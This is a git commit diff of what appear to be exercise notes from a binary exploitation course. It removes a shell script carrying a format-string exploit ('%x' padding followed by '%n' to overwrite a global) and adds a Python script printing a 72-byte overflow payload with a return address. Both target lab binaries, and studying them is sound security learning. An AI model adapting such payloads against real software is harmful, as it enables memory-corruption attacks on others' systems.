96c9f47393d227b63e4846f8c87445729c4f3717
Devin <devneal@nealscape.mit.edu>
2017-01-04 19:28:28 -0500

    Finished most of day4

--- notes/day4/global_overwrite/command.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-
-./global_overwrite "$(python -c "print 'AAAAAAAAAAA' + '\x28\xa0\x04\x08' + 'AAAA' + '%x ' * 163 + '%n'")"
---
+++ notes/day4/heap_overflow/input.py
@@ -0,0 +1,3 @@
+#!/usr/bin/python
+
+print "A" * 72 + "\x9b\x84\x04\x08"
